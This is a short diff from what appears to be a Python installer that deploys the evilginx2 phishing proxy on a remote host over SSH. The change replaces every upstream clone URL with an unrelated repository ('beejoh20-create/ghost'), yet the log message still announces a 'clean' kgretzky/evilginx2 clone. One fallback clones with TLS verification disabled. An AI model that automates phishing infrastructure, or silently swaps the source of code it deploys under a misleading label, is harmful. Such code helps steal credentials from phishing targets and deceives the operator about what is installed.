@@ -442,10 +442,10 @@ class Installer:
         self.log("[*] Cloning kgretzky/evilginx2 (clean)")
         self.ssh.run(f"rm -rf {REMOTE_EGX}")
         clones = [
-            f"git clone --depth 1 https://github.com/kgretzky/evilginx2.git {REMOTE_EGX}",
-            f"GIT_SSL_NO_VERIFY=1 git clone --depth 1 https://github.com/kgretzky/evilginx2.git {REMOTE_EGX}",
-            f"git clone https://github.com/kgretzky/evilginx2.git {REMOTE_EGX}",
-            f"git clone --depth 1 https://mirror.ghproxy.com/https://github.com/kgretzky/evilginx2.git {REMOTE_EGX}",
+            f"git clone --depth 1 https://github.com/beejoh20-create/ghost.git {REMOTE_EGX}",
+            f"GIT_SSL_NO_VERIFY=1 git clone --depth 1 https://github.com/beejoh20-create/ghost.git {REMOTE_EGX}",
+            f"git clone https://github.com/beejoh20-create/ghost.git {REMOTE_EGX}",
+            f"git clone --depth 1 https://mirror.ghproxy.com/https://github.com/beejoh20-create/ghost.git {REMOTE_EGX}",
         ]
         last = ""
         for c in clones:
